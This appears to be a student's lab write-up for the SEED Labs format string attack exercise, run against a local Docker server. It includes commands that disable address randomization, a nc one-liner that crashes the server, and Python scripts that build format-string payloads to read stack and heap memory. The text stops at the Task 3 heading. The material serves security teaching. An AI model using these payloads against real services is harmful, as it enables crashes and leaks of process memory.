# Seedlab Week #6 (Format String Attack Lab)

# Question 1

### Initial setup

1. Run `sudo sysctl -w kernel.randomize_va_space=0` to disable address randomization.
2. Compile the program using `make && make install`.
3. Start the server in a new terminal by running `docker-compose build` followed by `docker-compose up` in the `/ftm-containers` folder. This setup allows us to view the server's output.

### Task 1: Crashing the Program

The goal of this task is to crash the program by exploiting a format string vulnerability.

Common format string parameters used in this lab:

| Parameters | Output | 
| ---------- | ------ |
| `%x`       | Reads a value from the stack. |
| `%s`       | Reads a string from the process's memory. |
| `%n`       | Writes the number of characters printed so far to an address in memory. |

To crash the program, we sent a series of `%s` format specifiers. The server interprets these as pointers to strings, and and at some point tries to access an invalid memory address, causing a crash. We executed the following command: `echo %s%s%s%s%s | nc 10.9.0.5 9090` and then pressed `Ctrl + C`.

<p align="center" justify="center">
  <img src="./assets/LOGBOOK6/task1.png"/>
</p>

As shown in the output, the line `(ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)` is missing, indicating that the program crashed.

<!-- > **Note** in this task we could send just one `%s` because the first value in a stack is `0x11223344` ... Sera que da para esplicar porque isso nao endereso valido? -->

### Task 2: Printing Out the Server Program’s Memory

#### Task 2.A: Stack Data.

In this task, we aimed to print data from the stack and determine how many `%x` specifiers are needed to print the first 4 bytes of our input.

To achieve this, we used a Python script (`build_string.py`) to create a payload:

```py
import sys

s = b"AAAA" + b".%x"*100

with open('badfile', 'wb') as f:
  f.write(s)
```

The payload starts with `AAAA` followed by 100 `%x` specifiers, separated by dots for readability. And run `python3 build_string.py`; `cat badfile | nc 10.9.0.5 9090` and pressed `Ctrl + C`.

The output on the server:

<!-- se calhar por em vermelho o 41414141 -->
<p align="center" justify="center">
  <img src="./assets/LOGBOOK6/task2a.png"/>
</p>


We observed that the value `41414141` (hexadecimal representation of `AAAA`) appeared at the 64th position (counting the number of dots). This indicates that 64 `%x` specifiers are needed to print our 4 bytes from the process memory.

#### Task 2.B: Heap Data

In this attack the objective was to read a string from a specific address printed by the server:
<!-- Ele sempre o mesmo? -->
```bash
server-10.9.0.5 | The secret message's address:  0x080b4008
```
Steps to achieve this:

1. Place the address of the secret message (`0x080b4008`) at the beginning of the payload.
2. Use 63 consequences `%x` to skip 63 values on the stack (based on the previous task, where 63 values precede our written bytes).
3. Add single `%s` to instruct the server to read a string from the stack, which will be the address we placed in the step 1.

The final `build_string.py` code:

```py
import sys

address = 0x080b4008
address_in_bytes = (address).to_bytes(4,byteorder='little')

payload = address_in_bytes + b"%x"*63 + b"%s"

with open('badfile', 'wb') as f:
  f.write(payload)
```

We runed `python3 build_string.py` then sent `echo hello` to verify the string's address and then used our `badfile` to read a string (`cat badfile | nc 10.9.0.5 9090`).

The output:

<p align="center" justify="center">
  <img src="./assets/LOGBOOK6/task2b.png"/>
</p>

At the end of the output, we saw the string `"A secret message"`, confirming that we successfully read data from the heap.

### Task 3: Modifying the Server Program’s Memory

